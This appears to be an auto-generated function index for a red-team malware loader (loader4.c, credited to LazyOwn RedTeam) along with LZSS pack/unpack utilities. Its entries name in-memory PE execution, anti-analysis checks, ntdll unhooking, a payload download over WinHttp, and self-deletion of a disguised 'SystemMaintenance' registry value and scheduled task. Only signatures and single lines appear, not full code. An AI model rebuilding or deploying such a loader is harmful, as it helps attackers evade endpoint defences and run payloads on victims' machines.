### hook__wgetmainargs (function) `int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)`
- Defined: `loader4.c:602`

### hookexit (function) `int __cdecl hookexit(int status)`
- Defined: `loader4.c:605`

### hookExitProcess (function) `void __stdcall hookExitProcess(UINT statuscode)`
- Defined: `loader4.c:609`

### RunPE (function) `DWORD WINAPI RunPE(LPVOID lpParameter)`
- Defined: `loader4.c:612`

### PELoader (function) `void PELoader(char* data, DWORD datasize)`
- Defined: `loader4.c:618`

### anti_analysis (function) `BOOL anti_analysis()`
- Defined: `loader4.c:699`
- Doc: ================== ANTI-ANALYSIS & CLEANUP ==================

### selfDestruct (function) `void selfDestruct()`
- Defined: `loader4.c:719`

### getNtdll (function) `LPVOID getNtdll()`
- Defined: `loader4.c:747`
- Doc: ================== UNHOOKING ==================

### Unhook (function) `BOOL Unhook(LPVOID cleanNtdll)`
- Defined: `loader4.c:784`

### GetData (function) `DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource)`
- Defined: `loader4.c:811`
- Doc: ================== NETWORK ==================

### main (function) `int main(int argc, char** argv)`
- Defined: `loader4.c:879`
- Doc: ================== MAIN ==================

### Copyright (function) `Copyright (c) LazyOwn RedTeam 2025. All rights reserved. */ #define _CRT_RAND_S #define WIN32_LEAN_AND_MEAN #include <windows.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <st`
- Defined: `loader4.c:13`

### NTSTATUS (function) `typedef NTSTATUS (NTAPI *pNtContinue)(PCONTEXT ThreadContext, BOOLEAN RaiseAlert);`
- Defined: `loader4.c:122`

### GetThreadContext (function) `GetThreadContext(GetCurrentThread(), &ctx);`
- Defined: `loader4.c:137`

### NT_SUCCESS (function) `return NT_SUCCESS(NtContinue(&ctx, FALSE));`
- Defined: `loader4.c:158`

### free (function) `free(window);`
- Defined: `loader4.c:213`

### VirtualProtect (function) `VirtualProtect(p1, 1, old, &old);`
- Defined: `loader4.c:235`

### memset (function) `memset(ntdll, 0, sizeof(ntdll));`
- Defined: `loader4.c:244`
- Doc: Limpiar

### CryptSetKeyParam (function) `CryptSetKeyParam(hKey, KP_IV, iv, 0);`
- Defined: `loader4.c:263`

### printf (function) `printf("[-] CryptDecrypt failed: %u\n", GetLastError());`
- Defined: `loader4.c:265`

### void (function) `typedef void (WINAPI *typeSleep)(DWORD ms);`
- Defined: `loader4.c:301`

### DWORD (function) `typedef DWORD (NTAPI *typeNtFlushInstructionCache)(HANDLE, PVOID, ULONG);`
- Defined: `loader4.c:303`

### log (function) `log("[>] Flipped to RW");`
- Defined: `loader4.c:385`

### Sleep (function) `Sleep(ms);`
- Defined: `loader4.c:413`

### memcpy (function) `memcpy(code + 2, &jump, 8);`
- Defined: `loader4.c:427`

### GetProcAddress (function) `GetProcAddress(GetModuleHandleA(ntdll), "NtFlushInstructionCache");`
- Defined: `loader4.c:451`

### MultiByteToWideChar (function) `MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);`
- Defined: `loader4.c:481`

### LocalFree (function) `LocalFree(poi_masqArgvW);`
- Defined: `loader4.c:491`

### ExitThread (function) `ExitThread(0);`
- Defined: `loader4.c:606`

### entryPoint (function) `entryPoint();`
- Defined: `loader4.c:615`

### VirtualFree (function) `VirtualFree(pImageBase, 0, MEM_RELEASE);`
- Defined: `loader4.c:644`

### WaitForSingleObject (function) `WaitForSingleObject(hThread, INFINITE);`
- Defined: `loader4.c:691`

### CloseHandle (function) `CloseHandle(hThread);`
- Defined: `loader4.c:692`

### RegCloseKey (function) `RegCloseKey(hKey);`
- Defined: `loader4.c:707`

### GlobalMemoryStatusEx (function) `GlobalMemoryStatusEx(&mem);`
- Defined: `loader4.c:715`

### RegDeleteValueA (function) `RegDeleteValueA(hKey, "SystemMaintenance");`
- Defined: `loader4.c:726`

### system (function) `system("schtasks /delete /tn \"SystemMaintenanceTask\" /f > nul 2>&1");`
- Defined: `loader4.c:729`

### ExitProcess (function) `ExitProcess(0);`
- Defined: `loader4.c:743`

### TerminateProcess (function) `TerminateProcess(pi.hProcess, 0);`
- Defined: `loader4.c:759`

### WideCharToMultiByte (function) `WideCharToMultiByte(CP_UTF8, 0, wresource, -1, resourceA, sizeof(resourceA)-1, NULL, NULL);`
- Defined: `loader4.c:817`

### wprintf (function) `wprintf(L"[*] Downloading: %s (%s)\n", wresource, resourceA);`
- Defined: `loader4.c:818`

### WinHttpSetOption (function) `WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));`
- Defined: `loader4.c:830`

### WinHttpCloseHandle (function) `WinHttpCloseHandle(hRequest);`
- Defined: `loader4.c:834`

### ZeroMemory (function) `ZeroMemory(pszOutBuffer, dwSize + 1);`
- Defined: `loader4.c:846`

### srand (function) `srand(GetTickCount());`
- Defined: `loader4.c:880`

### AddVectoredExceptionHandler (function) `AddVectoredExceptionHandler(1, VEHHandler);`
- Defined: `loader4.c:921`

## lzss.c

### error (function) `static void error(void)`
- Defined: `lzss.c:15`

### putbit1 (function) `static void putbit1(void)`
- Defined: `lzss.c:17`

### putbit0 (function) `static void putbit0(void)`
- Defined: `lzss.c:25`

### flush_bit_buffer (function) `static void flush_bit_buffer(void)`
- Defined: `lzss.c:31`

### output1 (function) `static void output1(int c)`
- Defined: `lzss.c:34`

### output2 (function) `static void output2(int x, int y)`
- Defined: `lzss.c:39`

### encode (function) `void encode(void)`
- Defined: `lzss.c:45`

### getbit (function) `static int getbit(int n)`
- Defined: `lzss.c:76`

### decode (function) `void decode(void)`
- Defined: `lzss.c:86`

### fputc (function) `fputc(c, outfile);`
- Defined: `lzss.c:94`

## pack.c

### main (function) `int main(int argc, char *argv[])`
- Defined: `pack.c:7`

### encode (function) `extern void encode(void);`
- Defined: `pack.c:4`
- Doc: /* pack.c include <stdio.h> include <stdlib.h>

### printf (function) `printf("Usage: %s <input.exe> <output.lzss>\n", argv[0]);`
- Defined: `pack.c:10`

### fclose (function) `fclose(infile);`
- Defined: `pack.c:19`

## test.c

### main (function) `int main(void)`
- Defined: `test.c:8`

### decode (function) `void decode(void);`
- Defined: `test.c:6`
- Doc: /* test.c – wrapper decompress Okumura #include <stdio.h> #include <stdlib.h> /* declaraciones externas de Okumura

### fclose (function) `fclose(infile);`
- Defined: `test.c:17`
- Doc: #include <stdlib.h> /* declaraciones externas de Okumura void decode(void); extern FILE *infile, *outfile; int main(void

### printf (function) `printf("LZSS OK: decompressed -> test.exe\n");`
- Defined: `test.c:19`

## unpack.c

### main (function) `int main(int argc, char *argv[])`
- Defined: `unpack.c:7`

### decode (function) `extern void decode(void);`
- Defined: `unpack.c:4`
- Doc: /* unpack.c include <stdio.h> include <stdlib.h>

### printf (function) `printf("Usage: %s <input.lzss> <output.exe>\n", argv[0]);`
- Defined: `unpack.c:10`

### fclose (function) `fclose(infile);`
- Defined: `unpack.c:19`
